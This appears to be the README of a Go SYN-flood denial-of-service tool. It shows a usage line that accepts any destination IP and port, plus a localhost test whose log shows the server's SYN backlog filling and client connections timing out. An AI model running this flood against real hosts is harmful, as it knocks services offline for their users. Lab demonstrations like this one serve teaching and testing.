# syn-flood

```
syn-flood -host <destination-ip> -port <destination-port>
```

## manual test

- `go test -tags manual -run TestStartServer -v ./...` - terminal1: start a test server on `127.0.0.1:9999`
- `./syn-flood -host 127.0.0.1 -port 9999` - terminal2: run syn-flood against it

terminal1 example output
```
=== RUN   TestStartServer
2020/07/01 23:18:33 listening on 127.0.0.1:9999 - point syn-flood at this host:port
2020/07/01 23:18:39 SYN_RCVD: 0
2020/07/01 23:18:39 client request succeeded
2020/07/01 23:18:39 accepted connection from 127.0.0.1:52023
    # syn-flood started (terminal2)
    # SYN backlog queue filled up (macOS default kern.ipc.somaxconn is 128 by default)
2020/07/01 23:18:41 SYN_RCVD: 128
    # clients cannot connect to the server anymore
2020/07/01 23:18:42 client request failed: dial tcp 127.0.0.1:9999: i/o timeout
2020/07/01 23:18:44 SYN_RCVD: 128
2020/07/01 23:18:45 client request failed: dial tcp 127.0.0.1:9999: i/o timeout
2020/07/01 23:18:47 SYN_RCVD: 128
```
